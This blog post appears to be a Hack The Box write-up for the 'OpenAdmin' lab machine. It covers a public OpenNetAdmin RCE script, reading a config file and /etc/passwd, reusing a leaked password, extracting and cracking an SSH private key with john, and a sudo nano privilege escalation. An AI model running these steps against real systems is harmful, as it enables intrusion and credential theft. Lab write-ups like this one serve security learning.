---
layout: post
title: "[HTB] openadmin"
date: 2020-04-25 17:51:00 +0300
categories: htb hack
---

# openadmin

# user1

## portscan

* 22/tcp ssh
* 80/tcp httpd

## httpd

dirbust

* http://openadmin.htb/music
* http://openadmin.htb/sierra
* http://openadmin.htb/artwork

http://openadmin.htb/music -> login -> http://openadmin.htb/ona/

## OpenNetAdmin 18.1.1

<https://github.com/amriunix/ona-rce>
&nbsp;
```terminal
./rce.py http://openadmin.htb/ona/
cat local/config/database_settings.inc.php
```
&nbsp;
```php
<?php
$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
?>
```
&nbsp;
```terminal
cat /etc/passwd
```
&nbsp;
```text
...
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
...
```
&nbsp;
```terminal
ssh jimmy@openadmin.htb
n1nj4W4rri0R!
```

---
# user2
&nbsp;
```terminal
cat /etc/apache/sites-enabled/internal.conf
```
&nbsp;
```text
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

```
&nbsp;
```terminal
cat /var/www/internal/main.php
```
&nbsp;
```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```
&nbsp;
```terminal
curl localhost:52846/main.php
```
&nbsp;
```terminal
ssh2john id_rsa > priv.hash
john --wordlist=/usr/share/wordlist/rockyou.txt priv.hash

ssh joanna@openadmin.htb -i id_rsa
passphrase: bloodninjas
```

---
# root

```terminal
sudo -l

(ALL) NOPASSWD: /bin/nano /opt/priv
```

<https://gtfobins.github.io/gtfobins/nano/>
